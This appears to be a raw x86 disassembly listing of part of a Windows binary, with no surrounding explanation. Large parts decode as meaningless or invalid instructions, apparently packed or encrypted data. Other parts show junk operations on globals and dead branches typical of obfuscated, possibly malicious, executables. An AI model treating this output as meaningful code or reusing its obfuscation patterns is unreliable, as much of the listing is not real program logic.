  418d3e:	cli    
  418d3f:	sbb    bh,BYTE PTR [ebx]
  418d41:	in     al,dx
  418d42:	and    bh,ch
  418d44:	push   edi
  418d45:	dec    edx
  418d46:	sbb    DWORD PTR [edi-0x128b8517],edi
  418d4c:	jo     0x418d33
  418d4e:	sub    DWORD PTR [eax+0x65],esp
  418d51:	mov    ebp,0x1e848a2
  418d56:	lods   al,BYTE PTR ds:[esi]
  418d57:	ret    0x17e1
  418d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d5b:	jle    0x418dc6
  418d5d:	ins    BYTE PTR es:[edi],dx
  418d5e:	sub    al,0x1a
  418d60:	les    esp,FWORD PTR [edi+0x4e58f730]
  418d66:	aaa    
  418d67:	push   ebp
  418d68:	pop    esi
  418d69:	cmp    al,0x79
  418d6b:	stc    
  418d6c:	(bad)  [eax+0x57]
  418d6f:	xchg   ecx,eax
  418d70:	int    0xe
  418d72:	adc    ebx,esp
  418d74:	push   ss
  418d75:	sahf   
  418d76:	pop    esi
  418d77:	fiadd  WORD PTR [edx-0x2f]
  418d7a:	mov    dh,bl
  418d7c:	push   ds
  418d7d:	mov    eax,ds:0x1781e88f
  418d82:	xchg   ecx,eax
  418d83:	cs mov dl,0xf3
  418d86:	(bad)  
  418d87:	rcl    bh,cl
  418d89:	int    0xb0
  418d8b:	cwde   
  418d8c:	fiadd  DWORD PTR [esi-0x70a9c034]
  418d92:	lahf   
  418d93:	cli    
  418d94:	cmc    
  418d95:	mov    edx,0x232e4d10
  418d9a:	loopne 0x418dcf
  418d9c:	adc    ecx,DWORD PTR [ebx-0x52]
  418d9f:	adc    eax,0xba25a952
  418da4:	add    edx,eax
  418da6:	pop    edx
  418da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da8:	in     al,dx
  418da9:	enter  0xc00d,0xad
  418dad:	mov    edi,0x2507a713
  418db2:	rcr    BYTE PTR [ebp+0x58],0xd
  418db6:	jle    0x418d74
  418db8:	dec    ebx
  418db9:	and    eax,0x4144f67c
  418dbe:	mov    ds:0xe724a2a5,eax
  418dc3:	cli    
  418dc4:	ss jp  0x418dcc
  418dc7:	inc    esi
  418dc8:	mov    al,0x26
  418dca:	sub    edx,ebp
  418dcc:	mov    eax,0x994a51af
  418dd1:	jne    0x418e37
  418dd3:	cmc    
  418dd4:	mov    ds:0xb2f41458,eax
  418dd9:	ds out dx,al
  418ddb:	mov    ecx,DWORD PTR ds:0x97f8faca
  418de1:	int    0x12
  418de3:	jle    0x418e24
  418de5:	int    0xc0
  418de7:	dec    edx
  418de8:	enter  0x9768,0xa3
  418dec:	cmp    al,BYTE PTR [ecx+0x28]
  418def:	sahf   
  418df0:	push   edx
  418df1:	mov    dh,0xeb
  418df3:	into   
  418df4:	pop    edx
  418df5:	ret    0xfec0
  418df8:	mov    eax,0xe779bd20
  418dfd:	jne    0x418df1
  418dff:	mov    edx,0x882799f4
  418e04:	dec    edx
  418e05:	(bad)
  418e09:	mov    dh,BYTE PTR [ecx]
  418e0b:	cdq    
  418e0c:	sub    ah,0xbf
  418e0f:	inc    ebp
  418e10:	sub    dh,BYTE PTR [esi-0x299f2d62]
  418e16:	ss and eax,0x92ca34a8
  418e1c:	(bad)  
  418e1d:	das    
  418e1e:	or     BYTE PTR [eax],bl
  418e20:	les    edx,FWORD PTR [edx]
  418e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e23:	mov    eax,ds:0x9ddcc613
  418e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e29:	iret   
  418e2a:	and    al,0xa6
  418e2c:	les    ebp,FWORD PTR [edi-0x3084459f]
  418e32:	mov    ch,0x7b
  418e34:	mov    dh,0x85
  418e36:	pop    eax
  418e37:	lahf   
  418e38:	pusha  
  418e39:	lds    edi,FWORD PTR [ecx]
  418e3b:	sbb    eax,0x3a382d17
  418e40:	mov    al,0x9d
  418e42:	stc    
  418e43:	xor    DWORD PTR ds:0xb08b773c,0x5b51eaf
  418e4d:	jmp    0x418e9c
  418e4f:	in     al,dx
  418e50:	sbb    DWORD PTR [eax-0x45],0xffffffce
  418e54:	jo     0x418ec2
  418e56:	adc    DWORD PTR [esi-0x49],0x8920d709
  418e5d:	pop    edi
  418e5e:	jmp    DWORD PTR [eax]
  418e60:	cmp    eax,0xcb89c54
  418e65:	dec    ecx
  418e66:	test   eax,0xca57ca94
  418e6b:	cmp    eax,0xa713b1fb
  418e70:	lahf   
  418e71:	sti    
  418e72:	addr16 cmc 
  418e74:	add    ch,bl
  418e76:	ss mov edi,0xd829290b
  418e7c:	mov    DWORD PTR [edx-0x5a95511],esi
  418e82:	adc    BYTE PTR [edi],dl
  418e84:	xlat   BYTE PTR ds:[ebx]
  418e85:	call   0x1e50642d
  418e8a:	pop    ecx
  418e8b:	mov    esp,0xb86a6113
  418e90:	out    dx,al
  418e91:	retf   
  418e92:	dec    BYTE PTR [edi+edi*1+0x101f9971]
  418e99:	cmc    
  418e9a:	xor    BYTE PTR [esi-0x6d],0x28
  418e9e:	(bad)  
  418e9f:	dec    DWORD PTR [edi+0x56ba1253]
  418ea5:	(bad)  
  418ea6:	stos   BYTE PTR es:[edi],al
  418ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ea8:	icebp  
  418ea9:	sbb    bh,BYTE PTR [edi]
  418eab:	aaa    
  418eac:	ss idiv esp
  418eaf:	and    al,0x8b
  418eb1:	add    BYTE PTR [ebx],ah
  418eb3:	leave  
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x42835f,0x0
  418ec3:	mov    DWORD PTR ds:0x428127,0x216c
  418ecd:	mov    DWORD PTR ds:0x42822b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428223,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428233,0x562c
  418ef0:	mov    DWORD PTR ds:0x42825b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42835f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x4282e7
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428db4
  418f1a:	not    DWORD PTR ds:0x42815b
  418f20:	sub    DWORD PTR ds:0x42834f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428113
  418f32:	mov    edx,DWORD PTR ds:0x428257
  418f38:	sbb    DWORD PTR ds:0x42833b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x428293
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x4282cb,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42834f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x428363,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282bb,0x0
  418f6c:	not    DWORD PTR ds:0x428227
  418f72:	not    DWORD PTR ds:0x428157
  418f78:	mov    DWORD PTR ds:0x4282af,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x4282df
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282bb,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42833b
  418fb5:	call   DWORD PTR ds:0x428db8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x4281ef,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42814f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42833f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42814b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42812f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42811f,0x0
  41900e:	mov    DWORD PTR ds:0x428133,0x4347
  419018:	mov    DWORD PTR ds:0x428157,0x6064
  419022:	mov    DWORD PTR ds:0x42823f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428213,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42811f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428dbc
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282af
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x4281eb
  41906c:	or     DWORD PTR ds:0x42832f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x618f3402]
  419095:	sub    BYTE PTR [ecx+0x16c33fbc],0x18
  41909c:	mov    esp,0x69181812
  4190a1:	mov    eax,0xab0ee14e
  4190a6:	imul   esi,DWORD PTR ds:0x4f4bfe09,0x68c7cd0c
  4190b0:	push   ebp
  4190b1:	or     DWORD PTR [eax-0x75],ecx
  4190b4:	ins    DWORD PTR es:[edi],dx
  4190b5:	mov    ?,WORD PTR [esi-0x5f65fb27]
  4190bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190bc:	cli    
  4190bd:	imul   ecx,DWORD PTR [edx+0x56],0x25
  4190c1:	xchg   edx,eax
  4190c2:	jl     0x4190e5
  4190c4:	hlt    
  4190c5:	pop    ds
  4190c6:	dec    edx
  4190c7:	inc    ebp
  4190c9:	jle    0x4190cb
  4190cb:	mov    cl,0xd3
  4190cd:	adc    al,0x9b
  4190cf:	pop    eax
  4190d0:	ret    
  4190d1:	or     al,0x24
  4190d3:	sbb    esi,DWORD PTR [esp+ebp*2]
  4190d6:	mov    dh,0x2b
  4190d8:	out    0xc0,eax
  4190da:	pop    ebp
  4190db:	dec    ebx
  4190dc:	mov    DWORD PTR [eax+eax*8+0x7ed5a404],ebp
  4190e3:	(bad)  
  4190e4:	xor    bh,BYTE PTR [edi-0x69]
  4190e7:	(bad)  
  4190e8:	push   ds
  4190e9:	(bad)  
  4190ea:	sbb    ebx,ecx
  4190ec:	outs   dx,BYTE PTR ds:[esi]
  4190ed:	sub    dl,ch
  4190ef:	cmc    
  4190f0:	shr    BYTE PTR [eax-0x44e5250f],0x33
  4190f7:	add    al,BYTE PTR [edi-0x3c02c999]
  4190fd:	shr    DWORD PTR [ecx-0x43268a92],cl
  419103:	lods   eax,DWORD PTR ds:[esi]
  419104:	(bad)
  419108:	ss mov edi,0x5494b6c6
  41910e:	sti    
  41910f:	das    
  419110:	fimul  WORD PTR [ebx*2-0x56ba3d07]
  419117:	nop
  419118:	fwait
  419119:	dec    esp
  41911a:	or     DWORD PTR [edx],esi
  41911c:	xchg   esi,eax
  41911d:	mov    bh,0x35
  41911f:	test   BYTE PTR [ecx-0x66],bl
  419122:	(bad)  
  419123:	rcr    bl,1
  419125:	out    dx,al
  419126:	cmp    BYTE PTR [ecx+0x24f077c],bl
  41912c:	mov    BYTE PTR [ebp+ecx*8+0x3515b6a6],dh
  419133:	mov    al,bl
  419135:	sub    esp,DWORD PTR [ebx-0x1347a422]
  41913b:	and    DWORD PTR [ebp-0x13c44ef9],0xb
  419142:	pop    edx
  419143:	xor    ebx,DWORD PTR [edx-0x6]
  419146:	enter  0x9a08,0x84
  41914a:	out    dx,eax
  41914b:	imul   ebx,DWORD PTR [ecx+0x4bf3fc8c],0x51e5f746
  419155:	dec    esi
  419156:	in     eax,dx
  419157:	(bad)  
  419158:	fild   QWORD PTR [esi-0x16]
  41915b:	push   ss
  41915c:	add    ecx,DWORD PTR [edi-0x70]
  41915f:	hlt    
  419160:	push   DWORD PTR [esi]
  419162:	and    eax,0x43c3daaa
  419167:	adc    esi,eax
  419169:	jmp    0x41913a
  41916b:	hlt    
  41916c:	into   
  41916d:	fwait
  41916e:	inc    ebx
  41916f:	xchg   DWORD PTR [ebx],ecx
  419171:	aas    
  419172:	mov    ebp,0x14c72986
  419177:	clc    
  419178:	aaa    
  419179:	das    
  41917a:	sbb    dl,BYTE PTR [esi-0x56]
  41917d:	(bad)  
  41917e:	xchg   edx,eax
  41917f:	scas   eax,DWORD PTR es:[edi]
  419180:	les    ebp,FWORD PTR ds:0x83e81a09
  419186:	inc    esp
  419187:	into   
  419188:	arpl   cx,dx
  41918a:	inc    esi
  41918b:	loop   0x419141
  41918d:	dec    eax
  41918e:	jbe    0x4191c7
  419190:	jp     0x419204
  419192:	dec    esi
  419193:	test   DWORD PTR [esi-0x6d],ebx
  419196:	out    0x8,eax
  419198:	inc    ecx
  419199:	jg     0x41913c
  41919b:	cmp    bl,ah
  41919d:	sub    bl,cl
  41919f:	or     DWORD PTR [eax],ebp
  4191a1:	push   ebx
  4191a2:	xchg   ebp,edx
  4191a4:	xchg   edi,eax
  4191a5:	sahf   
  4191a6:	push   eax
  4191a7:	cwde   
  4191a8:	dec    edi
  4191a9:	mov    cl,0xe8
  4191ab:	cmp    dl,bh
  4191ad:	stos   BYTE PTR es:[edi],al
  4191ae:	cli    
  4191af:	pop    ds
  4191b0:	js     0x4191df
  4191b2:	fsubr  DWORD PTR [ebp-0x50]
  4191b5:	inc    ecx
  4191b6:	cld    
  4191b7:	leave  
  4191b8:	popa   
  4191b9:	inc    ebp
  4191ba:	mov    bh,0x8
  4191bc:	dec    esi
  4191bd:	test   DWORD PTR [edi],edx
  4191bf:	mov    bh,bl
  4191c1:	and    eax,DWORD PTR [edx+eiz*8]
  4191c4:	je     0x4191c2
  4191c6:	cmp    esi,ebp
  4191c8:	push   esi
  4191c9:	loope  0x4191ac
  4191cb:	dec    esi
  4191cc:	jo     0x41917f
  4191ce:	in     al,0x14
  4191d0:	jmp    0x2566c7db
  4191d5:	(bad)  
  4191d6:	pop    esi
  4191d7:	outs   dx,BYTE PTR ds:[esi]
  4191d8:	jmp    0x2df8443f
  4191dd:	sub    ebx,DWORD PTR [ebx-0x1a]
  4191e0:	jg     0x41925f
  4191e2:	rcl    BYTE PTR [edi-0x5c],0x21
  4191e6:	inc    ebx
  4191e7:	inc    ecx
  4191e8:	push   es
  4191e9:	push   0xffffffcd
  4191eb:	inc    ebp
  4191ec:	add    eax,0xd646dd1c
  4191f1:	ret    0xf875
  4191f4:	cmp    BYTE PTR [ecx+0x4d],cl
  4191f7:	xchg   esi,eax
  4191f8:	nop
  4191f9:	int3   
  4191fa:	mov    bh,0x53
  4191fc:	clc    
  4191fd:	add    al,0x28
  4191ff:	clc    
  419200:	stos   DWORD PTR es:[edi],eax
  419201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419202:	sbb    DWORD PTR [eax-0x56],edi
  419205:	mov    ebx,0xf6e9f541
  41920a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41920b:	mov    ebx,0x2f97a65b
  419210:	sar    BYTE PTR [ebx+0x727a6740],0x35
  419217:	push   0xffffffcf
  419219:	fidivr DWORD PTR [esi-0x663d4e38]
  41921f:	stc    
  419220:	scas   eax,DWORD PTR es:[edi]
  419221:	xchg   ecx,eax
  419222:	xlat   BYTE PTR ds:[ebx]
  419223:	mov    esi,DWORD PTR [ebp+ecx*1-0x1f]
  419227:	imul   ebp,DWORD PTR [ebx-0x3c],0x1ada4c74
  41922e:	(bad)  
  41922f:	pop    edi
  419230:	fwait
  419231:	add    al,0xc
  419233:	jmp    0x3b8771ca
  419238:	shr    eax,cl
  41923a:	scas   al,BYTE PTR es:[edi]
  41923b:	repnz or ebp,esp
  41923e:	aad    0xd4
  419240:	inc    esp
  419241:	mov    DWORD PTR [eax-0x15],0xad8fbfa3
  419248:	adc    DWORD PTR [esi-0x4e408828],esi
  41924e:	push   edx
  41924f:	imul   BYTE PTR [eax+0x33f09559]
  419255:	ficom  DWORD PTR [ecx]
  419257:	mov    eax,0xfcbfcad
  41925c:	xor    BYTE PTR [edi+0x5541801e],cl
  419262:	jbe    0x41923d
  419264:	sbb    al,0x26
  419266:	jp     0x4192a2
  419268:	xchg   ebp,eax
  419269:	xchg   ecx,eax
  41926a:	pusha  
  41926b:	in     eax,dx
  41926c:	jmp    0x4191fe
  41926e:	xor    al,0xac
  419270:	sub    ebx,DWORD PTR [ebx+0x35]
  419273:	test   al,0x21
  419275:	retf   
  419276:	jo     0x4192bc
  419278:	inc    esp
  419279:	cmp    al,BYTE PTR [esi]
  41927b:	dec    ecx
  41927c:	cmp    eax,0xf296c6da
  419281:	psadbw mm0,QWORD PTR [edx+0x78]
  419285:	dec    esp
  419286:	aas    
  419287:	pop    eax
  419288:	xlat   BYTE PTR ds:[ebx]
  419289:	mov    al,ch
  41928b:	ins    DWORD PTR es:[edi],dx
  41928c:	cmp    ebp,DWORD PTR [edi-0x6c]
  41928f:	aas    
  419290:	stc    
  419291:	(bad)  [eax]
  419293:	scas   eax,DWORD PTR es:[edi]
  419294:	aaa    
  419295:	je     0x419298
  419297:	stc    
  419298:	jl     0x4192e1
  41929a:	call   ebp
  41929c:	test   BYTE PTR [esi],bl
  41929e:	push   ebp
  41929f:	mov    ds:0x335477ac,eax
  4192a4:	stc    
  4192a5:	cmp    eax,0x61adb087
  4192aa:	push   edi
  4192ab:	ins    BYTE PTR es:[edi],dx
  4192ac:	fwait
  4192ad:	pop    edi
  4192ae:	pop    ebp
  4192af:	fdiv   DWORD PTR fs:[edi+0x63]
  4192b3:	mov    ds:0xe49dfda0,eax
  4192b8:	fdiv   DWORD PTR [ebx-0x9a59883]
  4192be:	mov    dh,0xf2
  4192c0:	pop    eax
  4192c1:	ret    0x617
  4192c4:	adc    BYTE PTR [ecx],bh
  4192c6:	lahf   
  4192c7:	int    0x35
  4192c9:	jbe    0x4192c9
  4192cb:	data16 cli 
  4192cd:	mov    ecx,0xa8a86aa6
  4192d2:	ret    
  4192d3:	nop
  4192d4:	push   esi
  4192d5:	pushf  
  4192d6:	push   ss
  4192d7:	les    edi,FWORD PTR [eax]
  4192d9:	cmc    
  4192da:	mov    ebp,0xc91e2f78
  4192df:	in     eax,0x91
  4192e1:	int3   
  4192e2:	mov    esp,0xee20338a
  4192e7:	repz addr16 cwde 
  4192ea:	sahf   
  4192eb:	xchg   ebx,eax
  4192ec:	add    dh,BYTE PTR [ecx+ebx*4+0x55]
  4192f0:	arpl   WORD PTR [edi],ax
  4192f2:	jecxz  0x4192bd
  4192f4:	or     DWORD PTR [edi-0x1],esp
  4192f7:	fistp  QWORD PTR [esi]
  4192f9:	(bad)  [ecx+0x7f]
  4192fc:	jmp    0x8d91:0x4f586744
  419303:	into   
  419304:	inc    ebx
  419305:	xchg   edx,eax
  419306:	gs js  0x41930d
  419309:	mov    es,WORD PTR [esi+0x561f139b]
  41930f:	pop    edx
  419310:	inc    eax
  419311:	or     eax,DWORD PTR [ebx-0x6e]
  419314:	cmc    
  419315:	test   eax,0xeb11b74b
  41931a:	pop    ebp
  41931b:	mov    esi,0x138051d5
  419320:	jp     0x4192a6
  419322:	inc    ecx
  419323:	retf   0xed52
  419326:	sbb    bl,BYTE PTR [eax]
  419328:	or     al,0xd
  41932a:	lds    ebx,FWORD PTR [ecx]
  41932c:	iret   
  41932d:	shl    esp,0xdc
  419330:	dec    edi
  419331:	in     al,0x34
  419333:	push   eax
  419334:	jne    0x4192e5
  419336:	inc    ebx
  419337:	ret    0xa15b
  41933a:	pop    esi
  41933b:	popa   
  41933c:	inc    esp
  41933d:	test   al,0x36
  41933f:	loop   0x419333
  419341:	mov    eax,0x5cfb59d3
  419346:	mov    ebx,0x3a8eaa8
  41934b:	sub    al,BYTE PTR [ecx+edi*1-0x158d657f]
  419352:	dec    ebp
  419353:	fidivr DWORD PTR [ebp+0x7f]
  419356:	ds xchg ebx,esi
  419359:	or     ebx,eax
  41935b:	stos   DWORD PTR es:[edi],eax
  41935c:	mov    edx,0x11fdbe4f
  419361:	test   eax,0x578e3335
  419366:	fsubr  QWORD PTR [ebx+0x15]
  419369:	pop    eax
  41936a:	aas    
  41936b:	mov    eax,ds:0x9583b400
  419370:	lahf   
  419371:	rcl    BYTE PTR [ebx+0x5f9a3cd4],cl
  419377:	out    dx,eax
  419378:	jge    0x419309
  41937a:	loope  0x4193a5
  41937c:	fisubr DWORD PTR [edx+0x39]
  41937f:	daa    
  419380:	inc    esi
  419381:	pop    esp
  419382:	shl    DWORD PTR es:[edx+edx*1],cl
  419386:	es loop 0x4193cd
  419389:	cwde   
  41938a:	lods   eax,DWORD PTR ds:[esi]
  41938b:	imul   ebp,esi,0x7
  41938e:	iret   
  41938f:	shr    esi,1
  419391:	dec    esi
  419392:	aad    0xb4
  419394:	leave  
  419395:	std    
  419396:	cmp    BYTE PTR [esi],0x79
  419399:	xor    DWORD PTR [eax+ebp*1],esi
  41939c:	retf   0x9746
  41939f:	sub    eax,0x10551e19
  4193a4:	cs aaa 
  4193a6:	retf   
  4193a7:	add    al,0x49
  4193a9:	add    DWORD PTR [ebx+0x18e428bf],0x4
  4193b0:	jns    0x419422
  4193b2:	subps  xmm5,xmm7
  4193b5:	repz push eax
  4193b7:	or     BYTE PTR [edx],dh
  4193b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ba:	loope  0x419381
  4193bc:	add    ch,BYTE PTR ds:0xc5d48e0b
  4193c2:	jecxz  0x4193a3
  4193c4:	mov    eax,0xbeaee28
  4193c9:	dec    edx
  4193ca:	fcmovu st,st(1)
  4193cc:	dec    ebp
  4193cd:	test   al,0x3b
  4193cf:	call   FWORD PTR [ecx]
  4193d1:	jmp    0xd906:0xdbdf9329
  4193d8:	sti    
  4193d9:	scas   eax,DWORD PTR es:[edi]
  4193da:	cmp    al,0xc9
  4193dc:	pop    edx
  4193dd:	push   edx
  4193de:	push   0xb97e61f4
  4193e3:	arpl   WORD PTR [ecx+eiz*2],ax
  4193e6:	popa   
  4193e7:	fst    DWORD PTR [ebp-0x15]
  4193ea:	add    BYTE PTR [ebp+0x26],dh
  4193ed:	ds fs jb 0x419404
  4193f1:	je     0x419453
  4193f3:	mov    BYTE PTR [esp+edx*2+0x761f156f],ch
  4193fa:	and    al,bh
  4193fc:	cmc    
  4193fd:	jmp    0x419392
  4193ff:	inc    esi
  419400:	inc    esi
  419401:	mov    bh,0x32
  419403:	imul   esp,DWORD PTR [ecx+ebx*8+0x5248ec16],0xfffffff5
  41940b:	dec    esp
  41940c:	mov    edx,esp
  41940e:	xor    dl,ah
  419410:	ds xor eax,0x23c967ee
  419416:	inc    edx
  419417:	inc    ebp
  419418:	arpl   WORD PTR [edx],sp
  41941a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41941b:	adc    BYTE PTR [ecx],bl
  41941d:	das    
  41941e:	dec    esp
  41941f:	fdiv   DWORD PTR [ebx-0x24]
  419423:	mov    ebx,0x248f99ef
  419428:	mov    ch,0xb7
  41942a:	int    0xeb
  41942c:	dec    edx
  41942d:	adc    eax,0x6ef0cb9d
  419432:	icebp  
  419433:	adc    dl,al
  419435:	jo     0x4193dd
  419437:	and    DWORD PTR [ebp-0x6ca69e14],edx
  41943d:	out    dx,eax
  41943e:	out    0x7a,al
  419440:	inc    esi
  419441:	cmp    eax,0x86c45c37
  419446:	call   0xf724ebe6
  41944b:	fdiv   QWORD PTR [ecx-0x38b1bb95]
  419451:	fisttp DWORD PTR [ebx+0x84248c]
  419457:	add    BYTE PTR [eax],al
  419459:	shrd   eax,ecx,0x2
  41945d:	cmp    DWORD PTR ds:0x4281ff,0x0
  419464:	mov    DWORD PTR ds:0x428357,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x428363,0x3a28
  419482:	cmp    DWORD PTR ds:0x4281ff,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428dc0
  41949a:	mov    DWORD PTR ds:0x42823b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282a3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x4282db,edx
  4194b2:	mov    DWORD PTR ds:0x428263,0x52b1
  4194bc:	or     DWORD PTR ds:0x42813b,edx
  4194c2:	and    DWORD PTR ds:0x42833f,ecx
  4194c8:	cmp    DWORD PTR ds:0x4282e7,0x0
  4194cf:	mov    DWORD PTR ds:0x4282e7,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x428263,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x428363,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42813f,0x3203
  419506:	cmp    DWORD PTR ds:0x4282e7,0x0
  41950d:	jge    0x41953e
  419513:	push   0x42807b
  419518:	push   0x42805f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e54
  419528:	adc    DWORD PTR ds:0x428147,0x266f
  419532:	xor    DWORD PTR ds:0x42833f,ebx
  419538:	xor    DWORD PTR ds:0x4282c7,ecx
  41953e:	mov    DWORD PTR ds:0x428137,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428213
  41954e:	dec    DWORD PTR ds:0x4282c7
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282b7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42834b,0x428367
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42814f,0x0
  419589:	mov    DWORD PTR ds:0x42813f,0x514f
  419593:	mov    DWORD PTR ds:0x428143,0x65eb
  41959d:	mov    DWORD PTR ds:0x4281f3,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428253,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42814f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42800d
  4195cd:	push   0x428029
  4195d2:	call   DWORD PTR ds:0x428e58
  4195d8:	adc    DWORD PTR ds:0x428267,ecx
  4195de:	and    DWORD PTR ds:0x42825b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428133,ebx
  4195ee:	and    DWORD PTR ds:0x42823f,0x6136
  4195f8:	add    DWORD PTR ds:0x428147,ebx
  4195fe:	mov    eax,ds:0x422518
  419603:	and    DWORD PTR ds:0x4282cf,0x428237
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42812b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428153,0x428127
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428237,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x428267,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42823f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428253,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428143,0x428113
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428247,0x42820f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42812b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42812b,0x4282b7
  4196ab:	push   0x42239c
  4196b0:	sbb    DWORD PTR ds:0x428243,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x4281eb,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x4281ff
  4196da:	sbb    DWORD PTR ds:0x4282e3,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428213,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42822f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x4281fb,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428333,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282af
  419719:	mov    edx,0x8ae
